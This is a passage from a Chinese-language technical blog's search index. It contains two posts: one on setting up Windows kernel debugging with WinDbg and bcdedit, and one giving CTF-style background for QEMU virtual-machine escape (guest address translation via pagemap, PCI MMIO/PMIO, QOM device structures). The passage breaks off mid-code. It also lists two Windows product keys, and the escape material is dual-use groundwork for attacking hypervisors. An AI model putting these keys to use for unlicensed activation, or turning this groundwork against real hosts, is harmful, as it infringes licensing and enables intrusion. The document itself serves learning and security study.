      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>windows双机调试</title>
    <url>/2024/01/18/Windows-%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<blockquote>
<p>如何调试内核</p>
</blockquote>
<span id="more"></span>
<h2 id="windows-vm"><a href="#windows-vm" class="headerlink" title="windows vm"></a>windows vm</h2><h3 id="win10-11-虚拟机"><a href="#win10-11-虚拟机" class="headerlink" title="win10&#x2F;11 虚拟机"></a>win10&#x2F;11 虚拟机</h3><p>安装好VM，禁止系统更新，避免gadget地址改变。</p>
<p>神奇的字符串，不知道为什么出现在这里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KH2J9-PC326-T44D4-39H6V-TVPBY   // 10</span><br><span class="line">BCQNW-3VWYB-4V7QD-M6R2B-7MH26   // 11</span><br></pre></td></tr></table></figure>

<h3 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h3><h4 id="符号信息"><a href="#符号信息" class="headerlink" title="符号信息"></a>符号信息</h4><p>WinDbg preview –&gt; File –&gt; setting –&gt; debugging setting –&gt; default symbol path</p>
<ul>
<li>如果在指定的目录找不到，就会远程下载</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">srv*C:\Symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>

<h4 id="双机调试"><a href="#双机调试" class="headerlink" title="双机调试"></a>双机调试</h4><h5 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h5><p>WinDbg 双机调试内核。</p>
<ul>
<li>虚拟机添加一个串行端口，选择命名管道，这个命名管道形式如：<code>\\.\pipe\com_1</code>，选择该端是服务，另一端是应用程序</li>
<li>windbg 选择 attach to kernel</li>
</ul>
<p>待调试机器：添加一个串口设备，使用命名的管道；开机后管理员开启cmd</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bcdedit /dbgsettings serial baudrate:115200 debugport:1</span><br><span class="line">bcdedit /copy &quot;&#123;current&#125;&quot; /d WinDebug        # 这一步成功会生成一个引导项，打印出其uuid</span><br><span class="line">bcdedit /displayorder &quot;&#123;current&#125;&quot; &quot;&#123;uuid&#125;&quot;   # 指定开机进入上一步的引导项</span><br><span class="line">bcdedit /debug &quot;&#123;uuid&#125;&quot; on                   # 开启debug</span><br></pre></td></tr></table></figure>

<p>调试机器：windbg attach kernel，填内容</p>
<ul>
<li>波特率：115200</li>
<li>管道：待调试机器的命名管道</li>
<li>resets: 0</li>
</ul>
<p>也可使用 也可  <code>win+r</code> 运行 msconfig</p>
<h5 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h5><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-a-network-debugging-connection">Set up KDNET network kernel debugging manually</a></p>
<figure class="highlight pwsh"><table><tr><td class="code"><pre><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings net hostip:w.x.y.z port:n</span><br><span class="line">shutdown <span class="literal">-r</span> <span class="literal">-t</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>打开签名认证开关</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bcdedit/<span class="built_in">set</span> testsigning on</span><br></pre></td></tr></table></figure>


<p>显示为 <code>Debuggee is running...</code>，后来才知道需要点击顶栏 <code>break</code> 进行断点</p>
<p>还可以使用 <code>VS</code> 调试。</p>
<p>参考：<a href="https://bbs.kanxue.com/thread-261326.htm">双机内核调试</a></p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Qemu-escape</title>
    <url>/2024/02/19/Qemu-escape/</url>
    <content><![CDATA[<blockquote>
<p>虚拟机逃逸实在是泰裤辣！！！</p>
</blockquote>
<span id="more"></span>

<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="qemu-mode"><a href="#qemu-mode" class="headerlink" title="qemu mode"></a>qemu mode</h3><ol>
<li>User mode：用户模式，在这种模式下，QEMU 运行某个单一的程序，并且适配其的系统调用。比如我们想在x86机器上运行arm程序可以选择</li>
<li>System mode：系统模式，在这种模式下，QEMU 可以模拟出一个完整的计算机系统。</li>
<li>KVM：KVM（Kernel-based Virtual Machine，基于内核的虚拟机）是一种 TYPE1 Hypervisor 虚拟化技术，VMM 和 HostOS 一体化，直接运行 Host Hardware 之上，实现硬件和虚拟机完全管控。</li>
<li>Xen：Xen是一个开放源代码虚拟机监视器，由剑桥大学开发。Xen的缺点是操作系统必须进行显式地修改（移植）以在Xen上运行（但是提供对用户应用的兼容性），所以比较麻烦。使得Xen无需特殊硬件支持，就能达到高性能的虚拟化。</li>
</ol>
<h3 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h3><p>每个qemu虚拟机都是宿主机上的一个<strong>进程</strong>，在进程中用mmap分配出大小为0x40000000字节的宿主机的虚拟内存来作为虚拟机的物理内存</p>
<p>一个经典的内存结构图<a href="https://aidaip.github.io/binary/2021/03/11/VM-escape-QEMU-Case-Study.html">(1)</a></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>

<p>PCI设备有其配置空间来保存设备信息，头部最开始的数据为Device id和Vendor id</p>
<h3 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h3><ol>
<li>从用户虚拟地址到用户物理地址：这一层转换是模拟真实设备中所需要的虚拟地址和物理地址而存在的，所以我们也可以通过分析转换规则，编写程序来模拟这一层转换。</li>
<li>从用户物理地址到 QEMU 的虚拟地址空间：这一层是把用户的物理地址转换为 QEMU 上使用 mmap 申请出的地址空间，这部分空间的内容与用户的物理地址逐一对应，所以我们只需要知道 QEMU 上使用 mmap 申请出的地址空间的初始地址，再加上用户物理地址，就可以得到此地址对应的在 QEMU 中的虚拟地址。</li>
<li>计算</li>
</ol>
<ul>
<li>在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，<code>/proc/pid/pagemap</code><a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/pagemap.html">(2)</a> 这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64 位的值。</li>
</ul>
<ol start="4">
<li>实现</li>
</ol>
<ul>
<li>因为虚拟化技术，存在Guest OS 和 Host OS 之分，这里是求 Guets OS 的物理地址</li>
</ul>
<p>如果我们在qemu虚拟机中申请一段内存空间，找到宿主机内存。同理可以找到物理内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得页内偏移后12位</span></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 虚拟地址获得页表 page frame number</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">lseek</span>(fd, offset, SEEK_SET);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// virtual address 转化为 phycial address</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = <span class="built_in">gva_to_gfn</span>(addr);</span><br><span class="line">    <span class="built_in">assert</span>(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | <span class="built_in">page_offset</span>((<span class="type">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    ptr_mem = <span class="built_in">gva_to_gpa</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PCI"><a href="#PCI" class="headerlink" title="PCI"></a>PCI</h3><p><strong>总线</strong>（bus）是一种将多个功能单元进行连接并允许功能单元之间进行数据交换的一种数据通路，在现代计算机中通常采用总线结构，即存在一根主要的公共通信干线，CPU 及各种设备都通过这跟总线进行通信。</p>
<p>PCI 即 <code>Peripheral Component Interconnect</code>，是一种<strong>连接电脑主板和外部设备的总线标准</strong>，其通过多根 PCI bus 完成 CPU 与 多个 PCI 设备间的连接，，在 X86 硬件体系结构中几乎所有的设备都以各种形式连接到 PCI 设备树上</p>
<p>PCI 标准中的三个基本组件：</p>
<ol>
<li><strong>PCI 设备</strong>（device）：符合 PCI 总线标准的设备都可以称之为 PCI 设备，在一个 PCI 总线上可以包含多个 PCI 设备</li>
<li><strong>PCI 总线</strong>（bus）：用以连接多个 PCI 设备与多个 PCI 桥的通信干道</li>
<li><strong>PCI 桥</strong>（bridge）：总线之间的<strong>连接枢纽</strong>，主要有以下三种：</li>
</ol>
<ul>
<li>HOST&#x2F;PCI 桥：也称为 PCI 主桥或者 PCI 总线控制器，用以连接 CPU 与 PCI 根总线，<strong>隔离设备地址空间与存储器地址空间</strong>，现代 PC 通常还会在其中集成内存控制器，称之为<strong>北桥芯片组</strong>（North Bridge Chipset）</li>
<li>PCI&#x2F;ISA 桥：用于连接旧的 ISA 总线，通常还会集成中断控制器（如 i8359A），称之为<strong>南桥芯片组</strong>（South Bridge Chipset）</li>
<li>PCI-to-PCI 桥：用于连接 PCI 主总线（Primary Bus）与次总线（Secondary Bus）</li>
</ul>
<h4 id="mmio-memory-mapped-io"><a href="#mmio-memory-mapped-io" class="headerlink" title="mmio : memory mapped io"></a>mmio : memory mapped io</h4><p>内存映射 IO。这种方式将 IO 设备的内存与寄存器映射到指定的内存地址空间上，此时我们便可以通过常规的访问内存的方式来直接访问到设备的寄存器与内存</p>
<h4 id="pmio-port-mapped-io"><a href="#pmio-port-mapped-io" class="headerlink" title="pmio : port mapped io"></a>pmio : port mapped io</h4><p>端口映射 IO。这种方式将 IO 设备的寄存器编码到指定的端口上，我们需要通过访问端口的方式来访问设备的寄存器与内存（例如在 x86 下通过 <code>in</code> 与 <code>out</code> 这一类的指令可以读写端口）。IO 设备通过专用的针脚或者专用的总线与 CPU 连接，这与内存地址空间相独立，因此又称作 isolated I&#x2F;O</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// b: byte</span></span><br><span class="line"><span class="comment">// w: word 2 byte</span></span><br><span class="line"><span class="comment">// l: long 4 byte</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">inb</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">short</span> <span class="title">inw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">inl</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outb</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outw</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">outl</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="查看系统pci设备"><a href="#查看系统pci设备" class="headerlink" title="查看系统pci设备"></a>查看系统pci设备</h4><p><a href="https://www.kernel.org/doc/html/next/translations/zh_CN/PCI/sysfs-pci.html">通过sysfs访问PCI设备资源</a></p>
<p>PCI 设备通过 <code>PCIbridge classcode: deviceid:vendorid</code> 区分。但是在真实设备中的信息更多</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># lspci -v</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2024</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>


<p><code>resource0</code>对应的是MMIO，而<code>resource1</code>对应的是PMIO（为0则代表没有。<code>resource</code>中数据格式是<code>start-address end-address flags</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># cat /sys/devices/pci0000:00/0000:00:03.0/resource</span></span><br><span class="line">0x00000000febc0000 0x00000000febdffff 0x0000000000040200</span><br><span class="line">0x000000000000c000 0x000000000000c03f 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~ # hexdump -C  /sys/devices/pci0000:00/0000:00:04.0/config </span><br><span class="line">00000000  34 12 24 20 03 01 00 00  10 00 ff 00 00 00 00 00  |4.$ ............|</span><br><span class="line">00000010  00 10 bf fe 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000020  00 00 00 00 00 00 00 00  00 00 00 00 f4 1a 00 11  |................|</span><br><span class="line">00000030  00 00 00 00 00 00 00 00  00 00 00 00 0b 01 00 00  |................|</span><br><span class="line">00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00000100</span><br></pre></td></tr></table></figure>

<h3 id="Qemu-Object-Model"><a href="#Qemu-Object-Model" class="headerlink" title="Qemu Object Model"></a>Qemu Object Model</h3><p>Qemu 是使用 C 编写的，但是充满了 OOP 的思想，在 Qemu 当中有着一套叫做 <strong>Qemu Object Model</strong><a href="https://github.com/qemu/qemu/blob/master/include/qom/object.h">(3)</a> 的东西来实现面向对象</p>
<p>在 QOM 当中使用成员嵌套的方式来完成类的继承，父类作为类结构体的第一个成员 <code>parent</code> 而存在，不支持多继承</p>
<ul>
<li><code>Type</code>：用来定义一个「类」的基本属性，例如类的名字、大小、构造函数等</li>
<li><code>Class</code>：用来定义一个「类」的静态内容，例如类中存储的静态数据、方法函数指针等</li>
<li><code>Object</code>：动态分配的一个「类」的具体的实例（instance），储存类的动态数据</li>
<li><code>Property</code>：动态对象数据的访问器（accessor），可以通过监视器接口进行检查</li>
</ul>
<p>在初始化设备时会初始化四个比较重要的结构体：TypeInfo -&gt; TypeImpl -&gt; ObjectClass -&gt; Object，每个 Object对应一个具体的device，其构造函数在qemu启动用<code>-device</code>参数加载设备时调用</p>
<h3 id="hw-misc-edu-c"><a href="#hw-misc-edu-c" class="headerlink" title="hw&#x2F;misc&#x2F;edu.c"></a>hw&#x2F;misc&#x2F;edu.c</h3><p>结合<a href="https://ctf-wiki.org/pwn/virtualization/qemu/environment/build-qemu-dev/">CTF Wiki</a>内容、<a href="https://elixir.bootlin.com/qemu/v8.1.4/source">Qemu source code</a>和文档<a href="https://www.qemu.org/docs/master/devel/qom.html">QEMU documentation</a></p>
<p>概念</p>
<ul>
<li>opaque: 表示不透明的设备</li>
<li>State: 虚拟设备</li>
</ul>
<h4 id="TypeInfo-定义设备"><a href="#TypeInfo-定义设备" class="headerlink" title="TypeInfo: 定义设备"></a>TypeInfo: 定义设备</h4><p>qemu中注册的每个设备都由一个TypeInfo类型来定义。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>比如在edu中的定义</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_edu_register_types</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> InterfaceInfo interfaces[] = &#123;</span><br><span class="line">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo edu_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_EDU_DEVICE,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="built_in">sizeof</span>(EduState),</span><br><span class="line">        .instance_init = edu_instance_init,</span><br><span class="line">        .class_init    = edu_class_init,</span><br><span class="line">        .interfaces = interfaces,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">type_register_static</span>(&amp;edu_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义了设备类型后，需要做的是注册这个类型。执行类型注册函数type_register()</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type_register_static</span>(&amp;edu_info);</span><br></pre></td></tr></table></figure>

<p>构造函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type_init</span>(pci_edu_register_types)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> type_init(function) module_init(function, MODULE_INIT_QOM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> module_init(function, type)                                         \</span></span><br><span class="line"><span class="meta">static void __attribute__((constructor)) do_qemu_init_ ## function(void)    \</span></span><br><span class="line"><span class="meta">&#123;                                                                           \</span></span><br><span class="line"><span class="meta">    register_module_init(function, type);                                   \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="class-实例化设备"><a href="#class-实例化设备" class="headerlink" title="class: 实例化设备"></a>class: 实例化设备</h4><p>type_rigister 执行后: 使用 TypeInfo 生成一个 <code>TypeImpl</code>，会发现成员变量几乎相同，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl的对象。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeImpl</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">size_t</span> class_size;</span><br><span class="line">    <span class="type">size_t</span> instance_size;</span><br><span class="line">    <span class="type">size_t</span> instance_align;</span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data);</span><br><span class="line">    <span class="type">void</span> *class_data;</span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line">    TypeImpl *parent_type;</span><br><span class="line">    ObjectClass *<span class="keyword">class</span>;                        <span class="comment">//指向 ObjectClass 的指针</span></span><br><span class="line">    <span class="type">int</span> num_interfaces;</span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注册类型TypeImpl之后就需要初始化该类型，其中有个叫class的成员。初始化其实就是初始化的它。当所有qemu总线、设备等的type_register_static执行完成后，即它们的TypeImpl实例创建成功后，qemu就会在type_initialize函数中去实例化其对应的ObjectClasses</p>
<p>ObjectClass是所有class的基类</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    Type type;</span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在edu中，class_init，这里使用ObjectClass作为参数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edu_class_init</span><span class="params">(ObjectClass *<span class="keyword">class</span>, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DeviceClass *dc = <span class="built_in">DEVICE_CLASS</span>(<span class="keyword">class</span>);</span><br><span class="line">    PCIDeviceClass *k = <span class="built_in">PCI_DEVICE_CLASS</span>(<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_edu_realize;</span><br><span class="line">    k-&gt;exit = pci_edu_uninit;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e8</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">    <span class="built_in">set_bit</span>(DEVICE_CATEGORY_MISC, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Object对象：<code>Type</code>以及<code>ObjectClass</code>只是一个类型，而不是具体的设备。<code>TypeInfo</code>结构体中有两个函数指针：<code>instance_init</code>以及<code>class_init</code>。<code>class_init</code>是负责初始化<code>ObjectClass</code>结构体的，<code>instance_init</code>则是负责初始化具体<code>Object</code>结构体的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Object</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="keyword">class</span>;</span><br><span class="line">    ObjectFree *free;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>class_init中的realize函数，其中PCIDevice也是一个已知结构体</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_edu_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EduState *edu = <span class="built_in">EDU</span>(pdev);</span><br><span class="line">    <span class="type">uint8_t</span> *pci_conf = pdev-&gt;config;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pci_config_set_interrupt_pin</span>(pci_conf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">msi_init</span>(pdev, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">true</span>, <span class="literal">false</span>, errp)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">timer_init_ms</span>(&amp;edu-&gt;dma_timer, QEMU_CLOCK_VIRTUAL, edu_dma_timer, edu);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">qemu_mutex_init</span>(&amp;edu-&gt;thr_mutex);</span><br><span class="line">    <span class="built_in">qemu_cond_init</span>(&amp;edu-&gt;thr_cond);</span><br><span class="line">    <span class="built_in">qemu_thread_create</span>(&amp;edu-&gt;thread, <span class="string">&quot;edu&quot;</span>, edu_fact_thread,</span><br><span class="line">                       edu, QEMU_THREAD_JOINABLE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_io</span>(&amp;edu-&gt;mmio, <span class="built_in">OBJECT</span>(edu), &amp;edu_mmio_ops, edu,</span><br><span class="line">                    <span 